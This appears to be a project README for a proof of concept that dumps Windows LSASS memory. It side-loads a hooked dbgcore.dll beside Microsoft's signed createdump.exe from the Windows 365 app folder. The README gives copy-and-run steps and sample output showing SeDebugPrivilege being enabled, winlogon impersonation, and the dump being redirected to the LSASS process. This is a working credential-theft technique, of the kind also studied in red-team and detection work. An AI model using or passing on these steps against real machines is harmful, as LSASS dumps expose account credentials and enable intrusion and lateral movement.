# Windows App LSASS Dump - Proof of Concept

This project demonstrates how to dump the LSASS process using the `createdump.exe` tool from WindowsApps, leveraging a custom hook to enable process access.

## How to Use

1. **Copy createdump from WindowsApp folder to a folder of choice (`copy C:\Program Files\WindowsApps\MicrosoftCorporationII.Windows365_2.0.285.0_x64__8wekyb3d8bbwe\wnc\createdump.exe .`)**
2. **place `dbgcore.dll` from this repo in the same folder**
3. **execute createdump (optionally provide parameters)**

Output should be something like this:
```
c:\work\_createdump>createdump.exe
WindowsApp PoC by Remko Weijnen
(ab)uses createdump tool from "The WindowsApp" to create an LSASS dump

Successfully hooked OpenProcess
OpenProcess called
Attempting to enable SeDebugPrivilege...
SeDebugPrivilege successfully enabled!
Attempting to impersonate winlogon...
Successfully impersonated winlogon
[createdump] Writing minidump with heap for process 35828 to file C:\Users\me\AppData\Local\Temp\dump.35828.dmp
MiniDumpWriteDump called with:
  ProcessId: 35828
  hProcess: 0x0000000000000184
  hFile: 0x00000000000001BC
  DumpType: 0x41a25
ProcessId changed to LSASS (PID: 1512)
Loaded DbgHelp.dll from: C:\Windows\System32\DbgCore.dll
Calling original with:
  ProcessId: 1512
  hProcess: 0x0000000000000184
  hFile: 0x00000000000001BC
  DumpType: 0x41026
MiniDumpWriteDump result: Success
[createdump] Dump successfully written in 270ms
DLL unloading, hooks removed.
```
